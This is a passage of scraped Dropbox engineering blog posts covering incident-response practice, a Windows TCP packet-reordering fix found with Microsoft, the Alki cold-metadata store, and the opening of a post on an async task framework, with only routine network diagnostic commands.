surfaced a variety of theoretical incidents, with varying degrees of likelihood. If any of these occurred, we were unlikely to stay within our downtime target. As we rolled up the risk assessment outputs to Infrastructure leadership, we aligned on which ones were worth investing in, and several teams set out to eliminate these scenarios. For a few examples: Push time for our monolithic backend service was > 20 minutes. The owners of the service optimized the deployment pipeline below 20 minutes, and began running regular DRTs to ensure that push time never degraded. Promoting standby database replicas could take > 20 minutes, if we lost enough primary replicas during a single-rack failure. Our metadata team improved the rack diversity of our database systems, and shored up the tooling that handles database promotions. Changes to experiments and feature gates were hard to identify, and core teams could not roll back these changes in an emergency, making it likely it would take > 20 minutes to resolve an experimentation-related issue. So our experimentation team improved visibility for changes, ensured all experiments and feature gates had a clear owner, and provided rollback capabilities and a playbook to our central on-calls. By addressing these and other scenarios, we saw the number of lengthy availability incidents sharply decrease. We continue to use the “20-minute rule” as a measuring stick for new scenarios we uncover, and arguably should tighten this threshold over time. You can adopt a similar methodology in your own organization or team. Write down the potential incidents that will take the longest to handle, stack-rank them by likelihood, and improve the ones at the top of the list. Then, test how the scenario would actually play out with DRTs or “wheel of misfortune” exercises for your incident responders. Did the improvements reduce recovery time to a level that’s acceptable for your business? Holding the line at 99.9 With a tight SLA we don’t have a lot of time to react when things go wrong, but our tech stack is constantly changing underneath us. Where will the next risk pop up, and where do we focus our investments? In addition to the process changes mentioned above, to help hold the line we’ve built up authoritative data sources in two areas: A single source of truth for our SLA, and what incidents have affected it A dashboard tracking the relative impact of services in the critical path Having a single source of truth for our SLA makes it straightforward to plan around. This ensures there is no confusion across the organization for how each team’s contributions, such as internal SLAs, bubble up to our customer guarantees. Tracing is used to determine what is in the critical path We also track the impact of services in the critical path using distributed tracing. The tracing infrastructure is used to calculate a weight for each service. This weight is an approximation of how important a given service is to Dropbox as a whole. When a service’s weight exceeds a threshold, additional requirements are enforced to ensure rigor in its operations. These weights (and the automation around them) serve two purposes. The first is to act as another data point in our risk assessment process; knowing the relative importance of services lets us better understand how risks in different systems compare. The second is to ensure we aren’t caught by surprise when a service is added to the critical path. With a system the size of Dropbox it’s hard to keep track of every new service, so tracking the critical path automatically ensures we catch everything. Estimating user impact “How painful is this SEV for our customers?” Addressing this question won’t speed up recovery, but it will allow us to communicate proactively to users through the BMOC and Be Worthy of Trust , which is our first company value. Again, every minute counts for our users during an incident. This question has proven particularly tricky for availability SEVs at Dropbox. You may have noticed above, our availability SEV level definitions start with a somewhat naive assumption that lower availability is more severe. This definition provided some simplicity as the company scaled up, but it has failed us in the long run. We’ve encountered SEVs with a steep availability hit but almost no customer impact; we’ve encountered minor availability hits that barely qualified as SEVs but rendered dropbox.com completely useless. The latter case was what kept us up at night, because we ran the risk of under-serving and under-communicating to our users. As a tactical fix we zeroed in on our website, which has lower traffic than our desktop and mobile apps (meaning web-specific availability issues may stand out less in the numbers). We worked with teams across engineering to identify ~20 web routes which corresponded to key webpages and components. We started monitoring availability for these individual routes, adding these metrics to our dashboards, alerts, and SEV criteria. We trained IMOCs and BMOCs on how to interpret this data, map an availability dip to specific impact, and communicate to customers—and we practiced with a tabletop exercise. As a result, in subsequent incidents impacting our website, we quickly got a sense whether key user workflows were affected, and used this information to engage with customers. We believe we still have work to do in this area. We’re exploring a variety of other ways we can pivot from measuring 9s to measuring customer experience, and we are excited by the technical challenges these will entail: Can we classify all of our routes, across platforms, into criticality-based buckets which we flag to the response team? How do we use direct signals of customer impact (such as traffic to help and status pages, customer ticket inflow, and social media reaction) to rapidly trigger an engineering response? At our scale, how do we efficiently estimate the number of unique users affected by an availability incident in real-time? How do we get more precise data on the populations affected—regions, SKUs, etc.—after the incident? Where will we benefit most from client-side instrumentation, to measure customer experience end-to-end? Continuous improvement Dropbox is not perfect at incident management—no one is. We started with a SEV process that worked great for where Dropbox was, but as our organization, systems, and user base grew, we had to constantly evolve. The lessons we outlined in this post didn’t come for free; it often took a bad SEV or two for us to realize where our incident response was lacking. That’s why it’s so critical to learn from your gaps in each incident review. You can’t fully prevent a critical incident from happening, but you can prevent the same contributing factor from coming back to bite you again. At Dropbox, this starts with a blameless culture in our incident reviews. If a responder makes a mistake during an incident, we don’t blame them. We ask what guardrails our tools were missing against human error, what training we failed to give the responder to prepare them for this situation, and whether automation could take the responder out of the loop in the first place. This culture allows all parties to feel comfortable confronting the hard lessons a SEV teaches us. Just as we don’t lay blame on individuals for our SEVs, no single person can take credit for the improvements we’ve made to Dropbox’s incident management. It truly has taken an organization-wide effort over the last several years to incorporate these lessons. But to name a few, we’d like to thank current and past members of the Reliability Frameworks, Telemetry, Metadata, Application Services, and Experimentation teams for the topics covered in this blog post. If you’re interested in helping us take incident management at Dropbox to the next level, we are hiring for Site Reliability Engineers. With Dropbox’s announcement that we are becoming a Virtual First company, location is flexible for these positions long-term. // Tags Infrastructure sre observability incident management reliability // Copy link Link copied Link copied", "date": "2021-01-05"},
{"website": "Dropbox", "title": "Boosting Dropbox upload speed and improving Windows’ TCP stack", "author": ["Alexey Ivanov"], "link": "https://dropbox.tech/infrastructure/boosting-dropbox-upload-speed", "abstract": "What users don’t know Dropbox does for them How we spotted the problem Debugging with Microsoft We find packet reordering Choosing a workaround Microsoft’s long-term fix Acknowledgments Appendix A. Academic research One of the best ways to find ways to improve performance, we’ve found, is to work closely with our customers. We love shared troubleshooting sessions with their own engineering teams to find and eliminate bottlenecks. In one of these, we found a discrepancy in upload speeds between Windows and Linux. We then worked with the Windows Core TCP team to triage the problem, find workarounds, and eventually fix it. The issue turned out to be in the interaction between the Windows TCP stack and firmware on the Network Interface Controllers (NIC) we use on our Edge servers. As a result, Microsoft improved the Windows implementation of the TCP RACK-TLP algorithm and its resilience to packet reordering. This is now fixed and available starting with Windows 10 build 21332 through the Windows Insider Program dev channel. How we got there is an interesting and instructive tale—we learned that Windows has some tracing tools beyond our Linux-centric experience, and working with Microsoft engineers led to both a quick workaround for our users and a long-term fix from Microsoft. Teamwork! We hope our story inspires others to collaborate across companies to improve their own users’ experiences. What users don’t know Dropbox does for them Dropbox is used by many creative studios, including video and game productions. These studios’ workflows frequently use offices in different time zones to ensure continuous progress around the clock. The workloads of such studios are usually characterized by their extreme geographic distribution and the need for very fast uploads/downloads of large files. All of this is usually done without any specialized software, using a Dropbox Desktop Client. The hardware used for these transfers varies widely: Some studios use dedicated servers with 10G internet connectivity, while others simply rely on thousands of MacBooks with normal Wi-Fi connectivity. On one hand, Dropbox Desktop Client has just a few settings. On the other, behind this simple UI lies some pretty sophisticated Rust code with multi-threaded compression, chunking, and hashing. On the lowest layers, it is backed up by HTTP/2 and TLS stacks. The outer simplicity of Dropbox Desktop Client can be quite misleading, though. Balancing performance with resource consumption across heterogeneous hardware and different use-cases is quite tricky: If we push compression too much, we starve upload threads on 10G servers . But if we pull it another way we waste bandwidth on slow internet connections. If we increase the number of hashing threads to speed up server uploads, laptop users suffer CPU/memory usage, which can cause their laptops to heat up. If we improve the performance of hashing code, it can cause high iowait on spinning disks. With so many different scenarios for optimization we try to understand each customer’s set of bottlenecks and make Dropbox Client adapt to its environment automatically, as opposed to bloating settings with a myriad of tunables. How we spotted the problem While doing routine performance troubleshooting for a customer we noticed slow upload speeds. As usual, our network engineers promptly established peering with the customer. This improved latencies a lot, but upload speed was still bogged down to a few hundred megabits per host—fast enough for most people, but too slow if you work with giant files all day. Shameless plug: Dropbox has an open peering policy . If you need a more direct path and lower packet loss, please peer with us ! Looking into the problem, we noticed that only Windows users were affected. Both macOS and Linux could upload at the network’s line rate. We set up a testing stand in the nearest cloud provider and began to drill down on Windows usage in a controlled environment. For us, as primarily Linux backend engineers, this was an interesting experience and learning opportunity. We started at the application layer with an API Monitor , a fairly sophisticated strace/ltrace analog for Windows. API Monitor for Windows Our hypothesis was that we might be “app limited”, i.e. there was not enough data being held in the socket buffer, which could cause upload speed to be limited. But we quickly saw this was not the case. Instead, the application was waiting on IOCP events from the kernel. This usually indicates bottlenecks at the TCP level. Now on familiar territory to us, we jumped into Wireshark. It immediately identified long periods of upload inactivity, in which the client’s machine was waiting for ACKs from the Dropbox side with a minuscule ~200kb of inflight data: Wireshark: sender waits for 21ms (rtt) ACKs. Then immediately sends a new batch of segments. But Wireshark’s tcptrace analog showed that bytes in flight were not limited by the receive window size.  This meant there was likely something inside the sending side’s TCP stack preventing it from growing its congestion window: Note the gaps between blue lines (outgoing segment runs) and the distance to green line (receive window) With this information, it was time to contact the Windows Core TCP Team to start digging into it together. Debugging with Microsoft The first thing Microsoft engineers suggested was to switch from our UNIX-y way of collecting packet dumps to a Windows-friendly way of doing the same thing: > netsh trace start provider=Microsoft-Windows-TCPIP capture=yes packettruncatebytes=120 tracefile=net.etl report=disabled perf=no There is also a tool called etl2pcapng that converts etl files to pcap . This lets you do in-depth packet analysis in Wireshark/ tshark . This was an eye-opening experience for us. We saw how far behind Linux is on the tracing tooling side. Even with all advances on the eBPF front, there’s still no unified format in Linux for collecting traces across all kernel subsystems. tcpdump is an awesome tool, but it only provides insight into what’s happening on the wire—it can’t connect that to other kernel events. netsh trace , on the other hand, correlates events on the wire with events that happen on the TCP layer, timers, buffer management, socket layer, and even the Windows asyncio subsystem (IOCP). Microsoft Message Analyzer parsing netsh trace output. Imagine a combination of tcpdump, perf trace, strace, and ss. Message Analyzer allowed us to dig deeper and confirm our theory of small congestion windows. (Sadly, Microsoft Message Analyzer has since been retired , likely due to performance issues it had. Microsoft now advises to use pktmon to analyze logs along with packet dumps.) We find packet reordering At that point Microsoft engineers also suggested we look into packet reordering that was present on the link: > tshark -r http2-single-stream.pcapng \"tcp.options.sack_le < tcp.ack\" | find /c /v \"\" 131 They explained: This filter is not direct evidence of packet reordering. It filters for DSACKs which likely indicates reordering because it tends to cause spurious retransmissions. If a system already has reordering resilience, this filter is not true anymore. Now the ball was on the Dropbox side to find where the reordering was introduced. Based on the SACKs observed in packet captures, it clearly happened somewhere before traffic hit our edge L7LBs ( we use Envoy ). Comparing the (mirrored) traffic on L4LBs (we use katran , an eBPF/XDP-based horizontally scalable, high-performance load balancer) to the traffic between L4LBs and L7LBs it became apparent that reordering happened somewhere there. We saw a reordering event for a single flow happening every 1-10 seconds. Nowadays, Windows is using CUBIC congestion control, just like Linux does by default. To get to 10 Gbps over 100ms RTT a loss-based CUBIC needs <0.000003% packet loss . So even a tiny amount of perceived packet loss might greatly affect the performance. Microsoft engineers also explained: At the same time, traditionally, TCP used the “3 duplicate ACK” heuristic which meant that any reordering in the network of degree 3 or more in number of packets is perceived as loss. After an approximate reordering location was identified we went through layer by layer, looking at each for an entity that could potentially reorder packets. We didn’t need to go far. First, we started by ruling out obvious stuff like network flapping and problems with the ECMP load-balancing. Then system engineers looked at our sufficiently sophisticated network cards, which could potentially reorder packets (at least from an OS point of view). This is a side-effect of an Intel NICs feature called “ Application Targeted Routing (ATR) .” In theory, this feature should reduce CPU usage by directing packets to the CPU that currently owns processing of that TCP flow , therefore, reducing cache misses. In practice, this may cause the OS to think that there is a reordering on the link. Especially severe reordering happens when a flow director’s filter table overflows and gets forcefully flushed: $ ethtool -S eth0 | fgrep fdir port.fdir_flush_cnt: 409776 port.fdir_atr_match: 2090843606356 It turns out that this is a known issue discussed in academic research papers (see Appendix A below). Choosing a workaround We considered a couple of alternative solutions to this problem: Pin proxy threads to CPUs. This, combined with IRQ pinning and XPS , should eliminate threads jumping from one core to another, removing the possibility of reordering. This is an ideal solution, but it would require quite a bit of engineering effort and rollout. We held off on this option unless we got closer to our CPU utilization limits on the Edge throughout the next couple of years. Reconfigure FlowDirector. 10G Intel NICs ( ixgbe ) used to have a FdirPballoc parameter that allowed changing the amount of memory that FlowDirector could use. But it’s not present in either i40e docs or newer kernel versions for ixgbe . We quickly lost interest in this path, so we didn’t go full “kernel-archeologist” on it to find out what had happened to this tunable. Just turn ATR off. Since we don’t rely on it in any way, we decided to go with this approach. We used ethtool’s “priv flags” machinery to turn ATR off # ethtool --set-priv-flags eth0 flow-director-atr off Note that different drivers/firmwares would likely have a totally different set of flags there. In this example, flow-director-atr is specific to Intel i40e NICs. After applying the change to a single PoP, server-side packet reordering immediately went down: Here we use the “Challenge ACK” rate as a proxy for the incoming reordering, since this is what we send to the client when data doesn’t arrive in order. On the client side, the Windows platform overall upload speed immediately went up proportionally: This is the Week-over-Week ratio for average per-chunk upload speeds. As a follow up we also began tracking our Desktop Client upload/download performance on a per-platform basis. Rolling out the fix across the whole Dropbox Edge Network brought up Windows upload speeds to be on par with macOS: Linux upload speeds here are not representative. The large portion of Linux hosts are servers with dozens of CPUs, RAIDs, and 1+Gbit/s Internet connections. Microsoft’s long-term fix This was the end of the story for us, but the Windows Core TCP team started work on adding reordering resilience to the Windows TCP RACK implementation. This concluded recently with the Windows 10 build 21332. It fully implements the recently published Standards Track RFC “ RFC 8985: The RACK-TLP Loss Detection Algorithm for TCP ,” including the reordering heuristic. This heuristic upgrades TCP to be resilient to up to a round-trip-time worth of packet reordering in the network. In theory, one can see that the rationale for the reordering heuristic covers our Flow-Director side-effect. One of the Microsoft team explained: “Upon receiving an ACK indicating a SACKed segment, a sender cannot tell immediately whether that was a result of reordering or loss. It can only distinguish between the two in hindsight if the missing sequence ranges are filled in later without retransmission. Thus, a loss detection algorithm needs to budget some wait time -- a reordering window -- to try to disambiguate packet reordering from packet loss.“ In practice, we reran our tests with the newest available Windows 10 build (10.0.21343.1000) against a single PoP, while toggling ATR on and off. We didn’t observe any upload performance degradation. Acknowledgments Even though this specific issue was very deep in our infrastructure network stack, troubleshooting it required work from multiple teams from both Dropbox and Microsoft sides: Dropbox Networking: Amit Chudasma. Dropbox Desktop Client Sync Engine Team: Geoffry Song, John Lai, and Joshua Warner. Microsoft Core TCP Team: Matt Olson, Praveen Balasubramanian, and Yi Huang. … and of course all our customers’ engineers who participated in our shared performance improvement sessions! Update (5/11/2021): For more on recent Windows TCP performance improvements, including HyStart++, Proportional Rate Reduction, and RACK-TLP, read “Algorithmic improvements boost TCP performance on the Internet” , a blogpost published by Microsoft’s TCP Dev team. It goes deeper into the theory behind these TCP features and provides benchmarks for TCP performance under different conditions. Microsoft’s benchmarks for TCP reordering resilience before and after the full RACK-TLP implementation. Appendix A. Academic research We were not the first to stumble upon this problem. Once we identified the culprit and started doing research, we found that it’s a known problem in HPC clusters. For example, here are a couple of excerpts from the paper, “ Why Does Flow Director Cause Packet Reordering? ” by Fermilab : // Tags Infrastructure Edge Network // Copy link Link copied Link copied", "date": "2021-05-03"},
{"website": "Dropbox", "title": "Alki, or how we learned to stop worrying and love cold metadata", "author": ["Jonathan Lee"], "link": "https://dropbox.tech/infrastructure/alki--or-how-we-learned-to-stop-worrying-and-love-cold-metadata", "abstract": "Metadata Storage at Dropbox Alki Conclusion We’re Hiring! In this post, we introduce Alki, a new cost efficient petabyte-scale metadata store designed for storing cold, or infrequently accessed, metadata. We’ll discuss the motivations behind building it, its architecture, and various aspects of how we were able to rapidly prototype and then productionize the system with a small team. Metadata Storage at Dropbox At Dropbox, we store most of our product metadata in an in-house one-size-fits-all database called Edgestore . Over time, however, small misalignments in values between Edgestore and the various product use cases it powers became increasingly problematic. Its architectural limitations around data sharding and capacity expansion made storing certain types of metadata at scale infeasible. Edgestore is built on top of MySQL with data stored on SSDs. In order to scale, data is distributed among a fixed set of MySQL databases, referred to as shards. An Edgestore cluster serves a subset of those shards and is comprised of a primary host and a number of secondary replica hosts. Capacity expansion in Edgestore works by increasing the number of database clusters and redistributing the shards. Capacity expansion in Edgestore via splits Assuming data is relatively evenly distributed among the hosts, when one cluster hits 80% disk space and needs to be split, most other clusters will also need to be split. This means that capacity expansion most often occurs by splitting the entire fleet, doubling the physical cost of Edgestore each time. Capacity Crunch Around fall of 2017, we split Edgestore from 256 clusters with 8 shards per cluster to 512 clusters with 4 shards per cluster. This increased Edgestore’s physical footprint from around 1500 database hosts to more than 3000 database hosts after accounting for local and geo-diverse replicas. From our capacity projections at the time, we predicted the need to split yet again in under just 2 years. Increasing usage of Edgestore from various products, coupled with the growth of Dropbox itself, was causing the rate of splits to increase. This was logistically problematic from a couple of perspectives. First, the financial cost for the exponentially larger and larger splits is a non-trivial amount of money to earmark. Second, buying and setting up so many machines at once is an all-hands-on-deck project for our hardware, datacenter, networking, and database teams and is hard to scale. Architecturally, Edgestore would also only be able to perform 2 more splits, after which we would reach 1 shard per cluster with no more splits available. Our levers for capacity expansion were quickly closing and we were heading into a capacity crunch. Options We began to build a replacement metadata storage engine, called Panda, underneath Edgestore that would support incremental capacity expansion, allowing us to add just a handful of clusters at a time and dynamically move subsets of data to the new clusters, but we knew this would be a multi-engineer-year project to build, validate, and migrate. In the meantime, we wanted to avoid the next round of splits, giving us roughly 2 years to solve Edgestore’s capacity crunch. We investigated and explored a number of options. Among them was an option to optimize Edgestore’s existing data model, shaving off some bytes here and there on schema overhead. Perhaps we could variable-length encode some pieces of metadata, or remove others primarily used for debugging and etc. Many ideas like this were explored by the team, but we determined for most of the ideas that the risks would be too high and the maintainability of the system would be harmed in the long-run in return for not much capacity reduction. Our database team also looked into switching the storage engine we use with MySQL 5.6 from InnoDB to Facebook’s MyRocks storage engine built on RocksDB, which has better compression. We also looked into trying to upgrade MySQL to 5.7 to enable usage of hole punching . One other option that was explored was running MySQL atop zfs for better compression as well. But testing and safely rolling out MySQL, kernel, and filesystem changes across a large fleet would be hard to validate safely. With plenty of unknowns, we didn’t want this to become a blocker. Ultimately, the path we took became apparent when we started to closely examine the data stored in Edgestore. Audit logs We noticed that the largest dataset stored in Edgestore, was from audit logs for our customers. These logs power several features that give Dropbox Business account administrators visibility into how their Dropbox data is being used and shared. As an example, admins can search for events via the insights dashboards , subscribe to events via streams using the get_events API , or generate activity reports . These log events are written and retained for many years, but outside of recently ingested events that are more frequently read randomly via the dashboard and get_events API, old events are rarely read and if read are usually done so in large batches of sequential objects. We refer to this as being hot, or frequently accessed, and cold, or infrequently accessed. Edgestore, optimized for low latency and high throughput reads of single objects, was a poor fit for this use case due to those largely cold traffic patterns. This was reflected in the high cost of storage from the underlying SSDs whose performance benefits were mostly un-reaped. Moreover, audit logs had been hitting write throughput limitations with Edgestore due to large teams generating proportionally large volumes of events that created too much write contention against MySQL. As such, we decided to work together with the team managing audit logs to look for a better solution to the audit log storage problem. Challenge The challenge when we set out to build Alki was to design, implement, and productionize a new optimized system with limited engineering resources in a short timeline. Beyond that, we wanted the system to be generic, benefiting many use cases besides audit logs, as well as to help reduce overall metadata storage costs at Dropbox. Among the few off-the-shelf options we explored, we looked at running HBase or Cassandra on in-house machines equipped with spinning disks. Given a longer timeline or a larger team, it may have been possible to fit our use case onto these systems as is, but we ultimately ruled these out as we didn’t think we could gain the expertise and build the tooling to operate these at scale with high durability in the required amount of time. One problem we ran into with many systems optimized for efficient storage of cold data was that they were unsuitable for high volumes of random reads and writes. While audit logs are eventually cold, they are ingested at high volume and frequently read randomly in the period right after ingestion which made those systems a poor fit for our use case. Given this dichotomy, we decided to build a two-tier system with separate layers for hot storage and cold storage. Data when written would be stored in hot storage, allowing for efficient random writes and reads. Eventually the data would be transitioned to cold storage, allowing for low-cost storage and efficient sequential reads at the expense of random read performance. Alki This approach gave us the flexibility to combine systems optimized for opposing goals rather than trying to find a single system good at both. We based the structure of this new system on log-structured merge-tree (LSM tree) storage systems. LSM tree This type of storage system is fairly popular and its concepts are used in many modern day storage systems like Cassandra, HBase, and BigTable. Writes In a non-distributed LSM tree database implementation, when a write request comes in, the new record is inserted into an in-memory sorted table. Implementation of this memory table varies, for example, it could be represented as a red-black binary search tree to allow for inserts and searches in logarithmic time. A key-value record [potato: vegetable] is inserted to our memory table in key order. However, memory is volatile and has smaller capacity relative to other storage mediums. It would not be scalable to store all data in in-memory tables. Offloads To limit the amount of data we keep in memory, we occasionally flush, or offload, the set of records out to disk, in a file, as a sorted list, or run, of records. For simplicity, we will refer to the data in the in-memory table as part of the in-memory run. A run of in-memory records are flushed out to a file on disk, containing the same records in the same sort order. Reads This complicates the reads because records could be located in either the in-memory table or in any of the on-disk runs. Therefore we need to search in the in-memory table and in all on-disk runs and merge the results for each read request. An example set of on-disk runs, representing data from multiple in-memory offloads. As an example, in order to find the key Blackberry with the above set of on-disk runs, we would need to search for that key in the runs for <Apple,...Tomato> and <Banana,...Zucchini> and merge the results. We do not need to check the <Chard,...Watermelon> run because we know the key falls outside of the run’s range of keys. If the key appears in no on-disk runs nor in the in-memory table, we know the record does not exist. If it appears in multiple places, we may choose to discard all of the old references in favor of the newest entry when merging results, depending on implementation. Efficient lookups of a key in any single run, in-memory or on-disk, can be easily implemented because data in each run is sorted by key. On the other hand, as the number of runs increase, the number of runs to read from for each read request also increase. This is problematic over time due to the periodic flushing of the in-memory run. This negatively impacts read performance and throughput and wastes disk resources on the read amplification. Compaction In order to limit this read amplification, we periodically compact/merge sets of small sorted runs on disk to larger sorted runs. Since runs are all sorted, this compaction process can be done fairly efficiently, similar to the merge phase of a merge sort. The [Apple, . . . Tomato] run and [Chard, . . . Watermelon] run are merged into the [Apple, . . . Watermelon] run. One way to perform this periodic compaction process would be to constantly compact every new on-disk run into a single global on-disk run. This approach would correlate the total number of on-disk runs at any point in time to the speed at which we could merge new runs into the global run relative to how often we flush runs from memory to disk. In practice, this approach would be quite inefficient as this would effectively cause compaction to have to re-write the entire global run each time, wasting disk resources on the write amplification. If we instead pick a compaction scheme that logarithmically compacts sets of runs, e.g. every 2 small runs into 1 medium run, every 2 medium runs into 1 large run, and etc., we can logarithmically bound the number of runs we would need to ever read from for any read request. Logarithmic compaction results in O(logN) runs with O(logN) compactions. This approach attempts to balance the write amplification of compacting too often with the read amplification of needing to read from too many runs. Alki’s Architecture The key trick of LSM trees is using multiple storage tiers to play to the strengths of different storage technologies. Specifically, you have a “hot” tier that's really good at high-throughput, fast, random access (which tends to make it correspondingly more expensive) and a “cold” tier where storage is really cheap, but where I/O throughput is lower and where reading/writing 10MB of data is about as expensive as 1KB (favoring infrequent access and big sequential access when you do any I/O at all). In non-distributed LSM trees, RAM makes a good “hot” tier, and disk a good “cold” tier. For Alki, we found a couple of existing cloud storage technologies with a similar cost/performance tradeoff relationship to RAM/disk, and we used the same tricks used by LSM trees to play to each layer’s strengths while presenting a unified read/write API. We use a distributed key-value store, Amazon DynamoDB , as the hot store, and a distributed blob store, Amazon S3 , as the cold store. We also use AWS Step Functions and an in-house batch processing system called Blackbird to orchestrate the control plane and run the offline ETL jobs. By building Alki on top of powerful building blocks that exposed well-defined APIs and feature sets, we did not have to spend valuable time and resources to tackle and re-solve many of the hard distributed database problems. Daily Lifecycle At the beginning of each day, we dynamically create a table in the key-value store, representing a run of data in which to ingest writes. At the end of the day, this hot run is sealed and the data is offloaded to the cold store as a sorted cold run. Once offloaded, the table for the hot run is deleted. Periodically, we compact the cold runs in the cold store, merging them in order to reduce the total number of runs. Once compacted, the source cold runs are deleted. Alki's architecture Cold Store Format In some LSM-tree based stores, offloaded data is stored using a variant of a special indexed file format that provides a mapping from keys to data pointers, pointing to the actual data stored elsewhere in the file. A similar implementation over a blob store might require multiple blob reads per lookup and markedly worse latencies, so we instead store this index as an internal metadata table in the key-value hot store. The indexing metadata itself could be very large depending on the ratio of the size of the keys versus the size of the values. In order to reduce the storage costs of storing this in the key-value store, we batch many records into a single S3 blob and only store a sparse mapping of 1 key for every blob, corresponding to the key of the first value in the blob. The blob that potentially contains any given key is found by searching for the last entry in the ordered index table with a first key smaller than or equal to the given key. Using a sparse index further optimizes for storage cost at the expense of potentially needing to read blobs that do not contain the key at all. AWS Services We chose to build Alki on top of AWS services for a few reasons. The main one is the relatively low maintenance cost of using fully managed systems which allowed us to rapidly prototype and build Alki. AWS gave us a great deal of access to their support engineers, who taught us many tips and tricks (and idiomatic usage patterns) to get the most out of the AWS services we were building on top of. DynamoDB and S3 are also horizontally scalable both in storage and throughput which allowed us to handle the scale of our audit logs and more from day one. This came in handy during the migration as we were able to easily scale up the systems to handle more than 100x steady state traffic and it continues to provide us benefits as we onboard other large use cases. However, the specific hot and cold stores are implementation details of Alki, and any of the backend systems could be easily swapped out, allowing us to take advantage of unique properties of other storage systems. Data Plane vs Control Plane Another benefit of using these managed systems as building blocks is that it allows the entire data plane on our end to be stateless, merely translating incoming requests into reads and writes against the underlying hot and cold store. This greatly reduces our maintenance cost to operate Alki. Periodic offload and compaction performed by our offline batch processing system. In the offline path, we use Blackbird (our batch execution system) together with StepFunctions to periodically perform the offload and compaction processes. Using a hot store that is horizontally scalable also removes the need to offload data with strict deadlines, since any downtime of the batch processing layer only results in extra storage cost, but not in unavailability or data loss. Likewise, an extended downtime of the compaction process only results in slightly degraded read latencies. Verification and Immutability For both offload and compaction verification, before committing and marking the new runs visible, we verify the correctness of the transitions by running a series of checks comparing the pre- and post- data. We validate that keys of the new run are sorted, counts of records match up, and that the hash of the (key, value) pairs match. For the hashing function, we use an order-independent hashing function built on arithmetic over several large prime modulos (a shout-out to our former teammate Robert Escriva, who conceived of the idea and open sourced an implementation). This allows us to compute the hash for a run efficiently by modulo summing the hashes from concurrently computed hashes of different chunks of the run. For compaction, it also allows us to compute the expected hash of the compacted run by simply modulo summing the hashes of the individual runs to be compacted. Verification of large scale batch operations to transform data is often a hard problem but is made easy in Alki by the immutability of data in a run once it is sealed. Development and Migration When designing and building large systems like this in a tight timeline, we found it helped to try to deliver incremental value as it helps to discover unknown unknowns as early as possible. This means that we split building Alki and the migration of audit log data from Edgestore into several phases with concrete deliverables that could help us re-prioritize and re-focus our efforts. Phase 0: Benchmarking Before settling on Amazon DynamoDB and S3, we developed and performed many artificial benchmarks against several hot and cold stores. This phase helped rule out several backends early on that would’ve caused significant pain down the line from performance and throughput limitations at scale. It also helped us develop good relationships early on with the DynamoDB and S3 solutions architects to learn how to operate those systems at scale. Phase 1: Double Writes We began by implementing a basic write path into the hot store that allowed us to start ingesting data in Alki. We immediately integrated this into the existing live write path of audit logs by writing to Edgestore first and attempting to write to Alki after. At this phase, we did not have the offload from hot to cold implemented, so we simply dropped the ingested data after some period of time to avoid incurring high cost due to the pile-up of data in expensive hot storage. Since we didn’t have confidence in Alki’s reliability yet, we didn’t count Alki write failures against our external APIs’ success rates, but the early integration helped us begin to gauge the performance and availability of Alki and to start building operational expertise. In particular, it revealed early on several issues with handling bursty requests in our gRPC layer and with provisioning of AWS DynamoDB capacity that we were able to implement best practices to mitigate. Phase 2: Double Reads w/ Edgestore as Source of Truth Once we had a read path implemented, we began to perform shadow reads on the live path. This meant every request to read audit log data would, in the background, issue the same request to Alki and compare the results. At first, because we had not yet made Alki durable and were regularly dropping data, this would show a high rate of missing records. Once we implemented the offline processes and reads of cold data, we were able to immediately verify that offload and reads worked by seeing the rate of missing records plummet to a low rate of reads of old records never ingested into Alki. Beyond allowing us to see immediate validation that our offload implementation worked, this early verification also allowed us to start building tooling around investigating the causes of mismatched reads, which became indispensable for tracking down bugs in the ingestion and read path. Once all of the functionality to read, write, and migrate data into Alki had been battle tested, we wiped Alki’s data one last time and begin to durably write audit logs into Alki. At this point, reads were still using Edgestore as a source of truth. In the background, we began to migrate data from Edgestore directly into Alki’s cold store using a batch upload API that we built. Phase 3: Double Reads w/ Alki as Source of Truth After we verified the migration was complete, we let the shadow read verification run for a few more weeks to build more confidence. We then switched the source of truth for reads and writes over to Alki. We remained in this double read/double write phase for another few weeks to ensure we could rollback to using Edgestore if needed. Though the rollback was never needed, the continuation of validating reads revealed that Alki actually ingested data more reliably than Edgestore. In particular, Alki was able to handle ingestion spikes more gracefully and we often saw Alki reads return more complete data than Edgestore. Phase 4: Alki Only Once we were confident Alki was working as expected, we turned off audit log writes to Edgestore and began deleting the now-migrated data from Edgestore. Conclusion Today, Alki serves roughly 350 TB worth of user data (pre-replication and not counting indexes), at about 1/6 the cost of Edgestore per GB per year. This was made possible by leveraging the inexpensive storage costs of cold blob storage. We’re in the process of onboarding a couple of other cold metadata use cases at Dropbox. In particular, there are many similar logging use-cases where the retention is long but the data is rarely read after some initial ingestion period that are prime for migration to our optimized cold metadata system. Looking forward, we’re also planning to build a system to automatically detect and migrate cold metadata from Edgestore and the in-development Panda key-value store into Alki. Many thanks to past and present contributors, design reviewers, and mentors: Anuradha Agarwal, James Cowling, William Ehlhardt, Alex Grach, Stas Ilinskiy, Alexey Ivanov, Anirudh Jayakumar, Gevorg Karapetyan, Olga Kechina, Zack Kirsch, Preslav Le, Jonathan Lee, Cheng Li, Monica Pardeshi, Olek Senyuk, Lakshmi Kumar T, Lawrence Xing, Sunny Zhang We’re Hiring! Do you enjoy building databases and storage infrastructure at scale? Dropbox has petabytes of metadata, exabytes of data, and serves millions of requests per second. The Persistent Systems team at Dropbox is hiring both SWEs and SREs to work on building the next generation of reliable, highly scalable, and durable storage systems. // Tags Infrastructure Metadata Databases Cold Storage Edgestore // Copy link Link copied Link copied", "date": "2020-12-17"},
{"website": "Dropbox", "title": "How we designed Dropbox ATF: an async task framework", "author": ["Arun Sai Krishnan"], "link": "https://dropbox.tech/infrastructure/asynchronous-task-scheduling-at-dropbox", "abstract": "Introduction Glossary Features System guarantees Lambda requirements Architecture Data model Lifecycle of a task Achieving guarantees Ownership model Extending ATF Conclusion I joined Dropbox not long after graduating with a Master’s degree in computer science. Aside from an internship, this was my first big-league engineering job. My team had already begun designing a critical internal service that most of our software would use: It would handle asynchronous computing requests behind the scenes, powering everything from dragging a file into a Dropbox folder to scheduling a marketing campaign. This Asynchronous Task Framework (ATF) would replace multiple bespoke async systems used by different engineering teams. It would reduce redundant development, incompatibilities, and reliance on legacy software. There were no open-source projects or buy-not-build solutions that worked well for our use case and scale, so we had to create our own. ATF is both an important and interesting challenge, though, so we were happy to design, build and deploy our own in-house service. ATF not only had to work well, it had to work well at scale: It would be a foundational building block of Dropbox infrastructure. It would need to handle 10,000 async tasks per second from the start, and be architected for future growth. It would 